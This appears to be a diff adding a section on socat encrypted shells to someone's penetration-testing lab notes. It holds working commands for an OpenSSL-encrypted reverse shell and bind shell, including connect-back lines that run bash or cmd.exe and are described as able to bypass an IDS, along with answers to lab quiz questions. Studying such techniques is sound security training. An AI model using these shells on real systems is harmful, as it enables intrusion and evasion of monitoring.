@@ -144,4 +144,56 @@ The first part is easy -- we're linking up with the listener running on our own 
 
 On the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left.
 
-## **Socat Encrypted Shells**
+## **Socat Encrypted Shells**  
+One of the many great things about socat is that it's capable of creating encrypted shells -- both bind and reverse. Why would we want to do this? Encrypted shells cannot be spied on unless you have the decryption key, and are often able to bypass an IDS as a result.
+
+Suffice to say that any time `TCP` was used as part of a command, this should be replaced with `OPENSSL` when working with encrypted shells.
+
+We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine.  This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When you run this command it will ask you to fill in information about the certificate. This can be left blank, or filled randomly.
+
+`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`
+
+We then need to merge the two created files into a single `.pem` file:
+`cat shell.key shell.crt > shell.pem`
+
+Now, when we set up our reverse shell listener, we use:
+`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -`
+
+This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. 
+
+*Note:*
+	The certificate _must_ be used on whichever device is listening.
+
+
+To connect back, we would use:
+`socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash`
+
+The same technique would apply for a bind shell:
+
+Target:
+`socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`  
+
+Attacker:
+`socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -`  
+
+Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.
+
+
+The following image shows an OPENSSL Reverse shell from a Linux target. The target is on the right, and the attacker is on the left:
+![[Pasted image 20240817195522.png]]
+
+Q) What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called “encrypt.pem”.
+
+- (normal reverse shell )
+	`socat TCP-L:53 FILE:tty,raw,echo=0`  
+
+- (encrypted using openssl )
+	`socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:tty,raw,echo=0` 
+
+Q) If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?
+
+- the regular syntax is this: 
+  `socat TCP:10.10.10.5:53 EXEC:”bash -li”, pty, stderr, sigint, setsid, sane`
+
+- encrypted using openssl:
+  `socat OPENSSL:10.10.10.5:53,verify=0 EXEC:”bash -li”, pty, stderr, sigint, setsid, sane`
